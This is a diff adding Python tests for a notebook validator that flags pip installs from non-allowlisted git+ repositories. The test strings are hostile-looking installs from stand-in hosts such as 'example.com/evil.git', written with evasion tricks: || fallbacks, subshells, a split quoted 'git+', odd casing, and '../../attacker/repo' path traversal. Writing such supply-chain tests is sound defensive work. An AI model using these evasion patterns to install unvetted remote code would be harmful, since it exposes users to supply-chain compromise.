@@ -590,6 +590,39 @@ def test_notebook_validator_moves_off_an_exclusive_endpoint():
             len(nv.rule_inst_004_torchcodec_torch(cell, on_the_endpoint, "nb.ipynb", 0)) == 1
         ), cell
 
+def test_every_rule_reads_the_filtered_invocations():
+    """Every reader asks what the cell leaves installed and takes the filtered iterator.
+    R-INST-001 asks what could run at all, and answers it from whole lines instead."""
+    nv = _load_notebook_validator_module()
+
+    cell = "!pip install foo || pip install --no-deps git+https://example.com/evil.git"
+    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [["foo"]]
+    assert len(list(nv.iter_pip_invocations(cell))) == 2
+
+    # The ban reads whole lines, so no shell construct can put a git+ source out of reach.
+    for evil in (
+        cell,
+        "!pip install foo || (pip install git+https://example.com/evil.git)",
+        "!pip install foo || if command -v uv; then pip install git+https://example.com/evil.git; fi",
+    ):
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
+        ), evil
+
+    # Still line-scoped: the allowlist holds, and a line with no pip command is not an install.
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    assert nv.rule_inst_001_git_plus('x = "git+https://example.com/evil.git"', "nb.ipynb", 0) == []
+
+    source = (REPO_ROOT / "scripts" / "notebook_validator.py").read_text(encoding = "utf-8")
+    assert (
+        source.count("in iter_pip_invocations(install_cell)") == 1
+    ), "only unconditional_pip_invocations may read the raw iterator; rules take the filtered one"
+
 def test_notebook_validator_keeps_a_group_conditional_throughout():
     """An `&&` or `;` inside a `(` or `{` group belongs to the group, so it does not end the
     fallback: if the left side succeeded, nothing in the group runs."""
@@ -669,6 +702,28 @@ def test_notebook_validator_reads_an_archive_given_as_a_path():
         == 1
     )
 
+def test_git_allowlist_is_scoped_to_each_source():
+    """One allowlisted repository on a line must not clear a prohibited one beside it. The
+    line-level scan finds every `git+` target; the allowlist then applies to each."""
+    nv = _load_notebook_validator_module()
+
+    allowed = "git+https://github.com/unslothai/unsloth-zoo.git"
+    evil = "git+https://example.com/evil.git"
+
+    assert nv.rule_inst_001_git_plus(f"!pip install {allowed}", "nb.ipynb", 0) == []
+    for cell in (
+        f"!pip install {evil}",
+        f"!pip install {allowed} ; pip install {evil}",
+        f"!pip install {allowed} || pip install {evil}",
+        f"!pip install {allowed} {evil}",
+    ):
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
+        ), cell
+
+    two_allowed = "!pip install {} git+https://github.com/state-spaces/mamba.git".format(allowed)
+    assert nv.rule_inst_001_git_plus(two_allowed, "nb.ipynb", 0) == []
+
 def test_notebook_validator_keeps_the_stricter_of_two_equal_floors():
     """`>=0.8.0,>0.8.0` intersect to the exclusive one, so the installed 0.8.0 still moves."""
     nv = _load_notebook_validator_module()
@@ -709,6 +764,50 @@ def test_notebook_validator_reads_a_named_direct_reference():
             )
         )
         == 1
+    )
+
+def test_git_allowlist_matches_the_repository_not_a_substring():
+    """An arbitrary repository can carry an allowlisted path inside its own, so the allowlist
+    is compared against the normalised host and path."""
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv._git_source_repository("git+https://user:pw@github.com/state-spaces/mamba.git@v2.0")
+        == "github.com/state-spaces/mamba"
+    )
+    assert nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth-zoo.git")
+    assert not nv._git_source_is_allowed(
+        "git+https://evil.example/repo/github.com/unslothai/unsloth.git"
+    )
+
+    smuggled = "!pip install git+https://evil.example/repo/github.com/unslothai/unsloth.git"
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
+
+    # Credentials and a trailing ref do not stop an allowlisted repository from matching.
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install git+https://user:pw@github.com/state-spaces/mamba.git@v2.0", "nb.ipynb", 0
+        )
+        == []
+    )
+
+def test_git_ban_reads_commands_not_the_comment():
+    """`_split_chained` drops a shell comment, so a comment naming a prohibited source is
+    documentation and must not fail the notebook."""
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install foo # avoid git+https://example.com/evil.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    # The executable half of the same line still counts.
+    assert any(
+        f.rule == "R-INST-001"
+        for f in nv.rule_inst_001_git_plus(
+            "!pip install git+https://example.com/evil.git # needed", "nb.ipynb", 0
+        )
     )
 
 def test_notebook_validator_ends_a_grouped_and_or_list_at_its_own_operator():
@@ -878,6 +977,24 @@ def test_notebook_validator_reads_a_compound_only_line():
         == 1
     )
 
+def test_git_ban_reads_the_arguments_shlex_produced():
+    """`"git+"https://...` is one argument to pip and two words to a text scan, so the
+    source has to be looked for in the parsed packages as well as in the command text."""
+    nv = _load_notebook_validator_module()
+
+    concatenated = '!pip install "git+"https://example.com/evil.git'
+    assert any(
+        f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(concatenated, "nb.ipynb", 0)
+    )
+
+    # The allowlist still applies to the joined argument.
+    assert (
+        nv.rule_inst_001_git_plus(
+            '!pip install "git+"https://github.com/unslothai/unsloth-zoo.git', "nb.ipynb", 0
+        )
+        == []
+    )
+
 def test_notebook_validator_keeps_a_pip_call_used_as_a_test():
     """`if pip install ...` is the condition, reached whenever the line is. Only a `then`,
     `elif`, `else` or `do` body depends on how that condition went."""
@@ -896,6 +1013,27 @@ def test_notebook_validator_keeps_a_pip_call_used_as_a_test():
         '!while true; do pip install "torch==2.12.0"; done',
     ):
         assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell
+
+def test_git_ban_only_reads_pip_commands():
+    """A `git+` in an `echo` beside an install installs nothing. The scan is per command, and
+    only the ones that parse as pip count."""
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
+        )
+        == []
+    )
+    assert nv.rule_inst_001_git_plus("!echo git+https://example.com/evil.git", "nb.ipynb", 0) == []
+
+    # The install beside it still counts when it is the one carrying the source.
+    assert any(
+        f.rule == "R-INST-001"
+        for f in nv.rule_inst_001_git_plus(
+            "!echo installing; pip install git+https://example.com/evil.git", "nb.ipynb", 0
+        )
+    )
 
 def test_notebook_validator_evaluates_environment_markers():
     """pip skips a requirement whose marker is false, so replaying its bounds moves a version
@@ -971,6 +1109,29 @@ def test_notebook_validator_expands_bundled_short_flags():
         == 1
     )
 
+def _one_cell_notebook(source: str) -> dict:
+    return {"cells": [{"cell_type": "code", "source": source.splitlines(keepends = True)}]}
+
+def test_install_cell_discovery_finds_compound_commands():
+    """The rules only see cells `install_cells` hands them, and it wanted `pip` right after
+    the `!`, so every compound form was invisible to the real lint flow no matter what the
+    splitter did with it."""
+    nv = _load_notebook_validator_module()
+
+    for source in (
+        "!pip install torch==2.12.0",
+        "!uv pip install torch",
+        "!pip uninstall -y torchcodec",
+        "!if command -v uv; then pip install git+https://example.com/x.git; fi",
+        "!echo start; pip install torch==2.12.0",
+        "!pip install foo || (pip install git+https://example.com/x.git)",
+    ):
+        assert nv.install_cells(_one_cell_notebook(source)), source
+
+    # Still anchored on the `!`, so a pip mention in Python is not an install cell.
+    for source in ('cmd = "pip install torch"', "import torch", "# pip install torch"):
+        assert nv.install_cells(_one_cell_notebook(source)) == [], source
+
 def test_notebook_validator_splits_on_single_control_operators():
     """`A & B` backgrounds A and runs B, `A | B` runs both. Neither opened a command boundary,
     so a line starting with something other than pip hid the install entirely."""
@@ -998,6 +1159,87 @@ def test_notebook_validator_splits_on_single_control_operators():
         "!pip install foo > log 2>&1"
     ]
     assert nv._split_chained('!pip install "a&b"')[0][0] == '!pip install "a&b"'
+
+def test_torchao_floor_ignores_a_requirement_pip_skips():
+    """R-INST-003 reads the floor from the same cell, so a requirement whose marker is false
+    must not satisfy it either."""
+    nv = _load_notebook_validator_module()
+
+    colab = {"peft": "0.20.0", "torchao": "0.10.0"}
+    assert [
+        f.rule
+        for f in nv.rule_inst_003_peft_torchao(
+            "!pip install \"torchao>=0.16.0; python_version < '3.10'\"", colab, "nb.ipynb", 0
+        )
+    ] == ["R-INST-003"]
+
+    # A marker that holds, and no marker at all, both still clear the floor.
+    for cell in (
+        "!pip install \"torchao>=0.16.0; python_version >= '3.10'\"",
+        '!pip install "torchao>=0.16.0"',
+    ):
+        assert nv.rule_inst_003_peft_torchao(cell, colab, "nb.ipynb", 0) == [], cell
+
+def test_git_allowlist_resolves_dot_segments_and_matches_exactly():
+    """`unslothai/unsloth/../../attacker/repo` reads as an allowlisted prefix and resolves to
+    somebody else's repository. Every entry is one `host/org/repo`, and pip puts a
+    subdirectory in the fragment, so the match is exact."""
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv._git_source_repository(
+            "git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
+        )
+        == "github.com/attacker/repo"
+    )
+    assert not nv._git_source_is_allowed(
+        "git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
+    )
+    assert not nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth/extra.git")
+
+    # The real forms still match: a ref, credentials, a fragment.
+    for allowed in (
+        "git+https://github.com/unslothai/unsloth.git",
+        "git+https://user:pw@github.com/state-spaces/mamba.git@v2.0",
+        "git+https://github.com/unslothai/unsloth-zoo.git#subdirectory=x",
+    ):
+        assert nv._git_source_is_allowed(allowed), allowed
+
+    smuggled = "!pip install git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
+
+def test_install_cell_discovery_glues_continuations():
+    """A `\\` continuation can put the `!` and the pip call on different physical lines, and
+    discovery reads lines."""
+    nv = _load_notebook_validator_module()
+
+    source = "!echo ready && \\\n  pip install git+https://example.com/pkg.git"
+    assert nv.install_cells(_one_cell_notebook(source))
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(source, "nb.ipynb", 0))
+
+def test_no_deps_rules_skip_a_requirement_pip_skips(monkeypatch):
+    """R-INST-002 and R-INST-005 read the raw pins themselves, so a marker-false `--no-deps`
+    requirement must not be treated as installed by either."""
+    nv = _load_notebook_validator_module()
+    monkeypatch.setattr(
+        nv,
+        "pypi_metadata",
+        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.30.0)"]}}
+        if name.lower() == "transformers"
+        else None,
+    )
+    colab = {"transformers": "5.0.0", "tokenizers": "0.22.2"}
+
+    skipped = "!pip install --no-deps \"transformers==5.5.0; python_version < '3.10'\""
+    assert nv.rule_inst_002_no_deps_transitive(skipped, colab, "nb.ipynb", 0) == []
+    assert nv.rule_inst_005_transformers_tokenizers(skipped, colab, "nb.ipynb", 0) == []
+
+    for applied in (
+        "!pip install --no-deps \"transformers==5.5.0; python_version >= '3.10'\"",
+        '!pip install --no-deps "transformers==5.5.0"',
+    ):
+        assert nv.rule_inst_002_no_deps_transitive(applied, colab, "nb.ipynb", 0), applied
+        assert nv.rule_inst_005_transformers_tokenizers(applied, colab, "nb.ipynb", 0), applied
 
 def test_notebook_validator_splits_keywords_on_any_whitespace():
     """A tab after `then` is the same command to the shell. Splitting on a literal space left
@@ -1227,6 +1469,26 @@ def test_notebook_validator_keeps_substitution_commands_in_order():
     findings = nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)
     assert len(findings) == 1
     assert "torchcodec==0.11.0" in findings[0].message
+
+def test_git_sources_are_matched_case_insensitively():
+    """pip normalises `Git+https://` to the same link, so the ban has to see it."""
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!pip install Git+https://example.com/pkg.git",
+        "!pip install GIT+HTTPS://example.com/pkg.git",
+    ):
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
+        ), cell
+
+    # The allowlist still clears an allowlisted repository whatever the case.
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install Git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
+        )
+        == []
+    )
 
 def test_notebook_validator_skips_a_prefixs_own_options():
     """`env -u VAR pip install ...` runs pip, and stripping only the word left the options in
